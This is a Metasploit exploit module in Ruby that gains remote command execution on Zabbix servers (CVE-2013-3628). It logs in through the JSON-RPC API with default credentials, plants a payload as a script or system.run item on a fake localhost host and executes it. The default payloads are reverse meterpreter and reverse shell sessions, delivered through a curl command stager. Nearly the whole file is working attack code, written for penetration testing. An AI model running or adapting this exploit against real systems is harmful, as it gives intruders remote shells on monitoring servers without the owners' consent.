##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

# TODO: Add VHOST support

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Zabbix Authenticated Remote Command Execution',
      'Description'    => %q{
      ZABBIX allows an administrator to create scripts that will be run on hosts.
      An authenticated attacker can create a script containing a payload, then a host
      with an IP of 127.0.0.1 and run the arbitrary script on the ZABBIX host.

      This module was tested against Zabbix v2.0.9, v2.0.5, v3.0.1, v4.0.18, v5.0.17, v6.0.0.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Brandon Perry <bperry.volatile[at]gmail.com>', # Discovery / msf module
          'lap1nou <lapinousexy[at]gmail.com>' # Update of the module
        ],
      'References'     =>
        [
          ['CVE', '2013-3628'],
          ['URL', 'https://blog.rapid7.com/2013/10/30/seven-tricks-and-treats']
        ],

      'Platform'       => ['unix', 'linux'],
      'Arch'           => [ARCH_CMD, ARCH_X86, ARCH_X64],
      'Targets'        => [
        [ 'Linux Dropper', {
          'Platform' => 'linux',
          'Arch' => [ARCH_X86, ARCH_X64],
          'Type' => :linux_dropper,
          'CmdStagerFlavor' => [ 'curl' ],
          'DefaultOptions' => {
            'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp'
          }
        }
      ],
      [
          'Unix Command', {
          'Platform' => 'unix',
          'Arch' => ARCH_CMD,
          'Type' => :unix_cmd,
          'DefaultOptions' => {
              'PAYLOAD' => 'cmd/unix/reverse'
          }
        }
      ]
      ],
      'DisclosureDate' => '2013-10-30',
      'DefaultTarget'  => 0,
      'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
    ))

    register_options(
    [
      OptString.new('USERNAME', [ true, "Username to authenticate with", 'Admin']),
      OptString.new('PASSWORD', [ true, "Password to authenticate with", 'zabbix']),
      OptString.new('TARGETURI', [ true, "The URI of the Zabbix installation", '/zabbix/']),
      OptString.new('TLS_PSK_IDENTITY', [ false, "The TLS identity", '']),
      OptString.new('TLS_PSK', [ false, "The TLS PSK", '']),
      OptString.new('USE_ITEM', [ false, "Choose if the module must use script or item way of achieving RCE, item is only available on Zabbix server >= 4.0", false])
    ])
  end

  def check
    auth_token = login()
    zabbix_version = get_version()

    str = rand_text_alpha(18)

    script_id = create_script(auth_token, zabbix_version, "echo #{str}")
    group_id = find_group_id(auth_token)
    host_id = create_host(auth_token, group_id, zabbix_version)

    resp = execute_script(auth_token, host_id, script_id, zabbix_version)

    if resp.get_json_document.dig('result', 'value').gsub("\n", '') == str
      return Exploit::CheckCode::Appears
    end

    return Exploit::CheckCode::Safe
  end

  def get_interfaceid(auth_token, host_id, zabbix_version)
    post = {
      "auth" => auth_token,
      "id" => 1,
      "jsonrpc" => "2.0",
      "method" => "hostinterface.get",
      "params" => {
          "hostids" => host_id,
          "output" => "extend"
      }
    }

    resp = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/api_jsonrpc.php'),
      'data' => post.to_json,
      'ctype' => 'application/json-rpc'
    })

    return resp.get_json_document.dig('result')[0]["interfaceid"]
  end

  def create_item(auth_token, host_id, zabbix_version, payload)
    interface_id = get_interfaceid(auth_token, host_id, zabbix_version)
    item_title = rand_text_alpha(18)
    print_status("Creating an item called #{item_title}")

    post = {
      "auth" => auth_token,
      "id" => 1,
      "jsonrpc" => "2.0",
      "method" => "item.create",
      "params" => {
          "delay" => 30,
          "hostid" => host_id,
          "interfaceid": interface_id,
          "key_" => "system.run[#{payload}, nowait]",
          "name" => item_title,
          "type" => 0,
          "value_type" => 3
      }
    }

    resp = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/api_jsonrpc.php'),
      'data' => post.to_json,
      'ctype' => 'application/json-rpc'
    })

    if resp.get_json_document.dig('result', 'itemids', 0) != nil
      vprint_good("Succesfully created a script")
    else
      vprint_bad(resp.body)
      fail_with(Failure::NoAccess, "Error creating script")
    end

    sleep(50)
  end

  def create_script(auth_token, zabbix_version, payload)
    script_title = rand_text_alpha(18)
    print_status("Creating a script called #{script_title}")

    post = {
      "auth" => auth_token,
      "id" => 1,
      "jsonrpc" => "2.0",
      "method" => "script.create",
      "params" => {
          "command" => payload,
          "name" => script_title,
          "type" => 0
      }
    }

    if zabbix_version >= "6.0.0"
      post['params'][:scope] = 2
    end

    resp = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/api_jsonrpc.php'),
      'data' => post.to_json,
      'ctype' => 'application/json-rpc'
    })

    begin
      script_id = resp.get_json_document.dig('result', 'scriptids', 0)

      if script_id != nil
        vprint_good("Succesfully created a script")
      else
        vprint_bad(resp.body)
        fail_with(Failure::NoAccess, "Error creating script")
      end
    rescue NoMethodError => e
      elog(e)
      fail_with(Failure::NoAccess, "Error creating script, the server didn't respond")

      return
    end

    return script_id
  end

  def execute_script(auth_token, host_id, script_id, zabbix_version)
    print_status("Executing the script...")

    post = {
      "jsonrpc" => "2.0",
      "method" => "script.execute",
      "params" => {
        "scriptid" => script_id.to_s,
        "hostid" => host_id.to_s
      },
      "auth" => auth_token,
      "id" => 1
    }

    sleep(30)

    resp = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/api_jsonrpc.php'),
      'data' => post.to_json,
      'ctype' => 'application/json-rpc'
    })

    if resp != nil and resp.get_json_document.dig('error') != nil
      print_status("Retrying to execute the script...")
      sleep(30)

      resp = send_request_cgi({
        'method' => 'POST',
        'uri' => normalize_uri(target_uri.path, '/api_jsonrpc.php'),
        'data' => post.to_json,
        'ctype' => 'application/json-rpc'
      })
    end

    return resp
  end

  def exploit_script(auth_token, zabbix_version)

    case target['Type']
    when :unix_cmd
      script_id = create_script(auth_token, zabbix_version, payload.encoded)
    when :linux_dropper
      script_id = create_script(auth_token, zabbix_version, generate_cmdstager[0])
    end

    group_id = find_group_id(auth_token)
    host_id = create_host(auth_token, group_id, zabbix_version)

    execute_script(auth_token, host_id, script_id, zabbix_version)
  end

  def exploit_item(auth_token, zabbix_version)
    group_id = find_group_id(auth_token)
    host_id = create_host(auth_token, group_id, zabbix_version)

    case target['Type']
    when :unix_cmd
      create_item(auth_token, host_id, zabbix_version, payload.encoded)
    when :linux_dropper
      create_item(auth_token, host_id, zabbix_version, generate_cmdstager[0])
    end
  end

  def find_group_id(auth_token)
    print_status('Getting a valid group id...')

    post = {
      "auth" => auth_token,
      "id" => 1,
      "jsonrpc" => "2.0",
      "method" => "hostgroup.get",
      "params" => {
          "output" => "extend"
      }
    }

    resp = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/api_jsonrpc.php'),
      'data' => post.to_json,
      'ctype' => 'application/json-rpc'
    })

    begin
      group_id = resp.get_json_document.dig('result', 0, 'groupid')

      if group_id != nil
        vprint_good("Sucessfully got a valid groupid")
      else
        vprint_bad(resp.body)
        fail_with(Failure::UnexpectedReply, "Error getting a valid groupid")
      end
    rescue NoMethodError => e
      elog(e)
      fail_with(Failure::NoAccess, "Error getting a valid groupid, the server didn't respond")

      return
    end

    return group_id
  end

  def create_host(auth_token, groupid, zabbix_version)
    host = rand_text_alpha(18)
    print_status("Creating a host called #{host}")

    post = {
      "auth" => auth_token,
      "id" => 1,
      "jsonrpc" => "2.0",
      "method" => "host.create",
      "params" => {
          "groups" => [
              {
                  "groupid" => groupid
              }
          ],
          "host" => host,
          "interfaces" => [
              {
                  "dns" => "",
                  "ip" => "127.0.0.1",
                  "main" => 1,
                  "port" => "10050",
                  "type" => 1,
                  "useip" => 1
              }
          ]
      }
    }

    if datastore['TLS_PSK_IDENTITY'] != '' or datastore['TLS_PSK'] != ''
      post['params'][:tls_connect] = 2
      post['params'][:tls_psk_identity] = datastore['TLS_PSK_IDENTITY']
      post['params'][:tls_psk] = datastore['TLS_PSK']
    end

    resp = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/api_jsonrpc.php'),
      'data' => post.to_json,
      'ctype' => 'application/json-rpc',
    })

    begin
      hostid = resp.get_json_document.dig('result', 'hostids', 0)

      if hostid != nil
        vprint_good("Sucessfully created an host")
      else
        vprint_bad(resp.body)
        fail_with(Failure::UnexpectedReply, "Error creating new host")
      end
    rescue NoMethodError => e
      elog(e)
      fail_with(Failure::UnexpectedReply, "Error creating new host, the server didn't respond")

      return
    end

    return hostid
  end

  def login()
    post = {
      "auth" => nil,
      "id" => 1,
      "jsonrpc" => "2.0",
      "method" => "user.login",
      "params" => {
          "password" => datastore['PASSWORD'],
          "user" => datastore['USERNAME']
      }
    }

    resp = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/api_jsonrpc.php'),
      'data' => post.to_json,
      'ctype' => 'application/json-rpc'
    })

    begin
      auth_token = resp.get_json_document.dig('result')

      if auth_token != nil
        print_good("Sucessfully logged in")
      else
        vprint_bad(resp.body)
        fail_with(Failure::UnexpectedReply, "Error connecting to the Zabbix interface")
      end
    rescue NoMethodError => e
      elog(e)
      fail_with(Failure::NoAccess, "Error connecting to the Zabbix interface, the server didn't respond")
    end

    return auth_token
  end

  def get_version()
    post = {
      "auth" => nil,
      "id" => 1,
      "jsonrpc" => "2.0",
      "method" => "apiinfo.version",
      "params" => {}
    }

    resp = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/api_jsonrpc.php'),
      'data' => post.to_json,
      'ctype' => 'application/json-rpc'
    })

    begin
      version = resp.get_json_document.dig('result')

      if version != nil
        vprint_status("Zabbix version number #{version}")
      else
        vprint_bad(resp.body)
        fail_with(Failure::UnexpectedReply, "Getting Zabbix version failed")
      end
    rescue NoMethodError => e
      elog(e)
      fail_with(Failure::NoAccess, "Getting Zabbix version failed, the server didn't respond")

      return
    end

    return version
  end

  def exploit
    if datastore['USE_ITEM'] == ''
      version = get_version()
      auth_token = login()
      exploit_script(auth_token, version)
    else
      version = get_version()
      auth_token = login()
      exploit_item(auth_token, version)
    end
  end
end
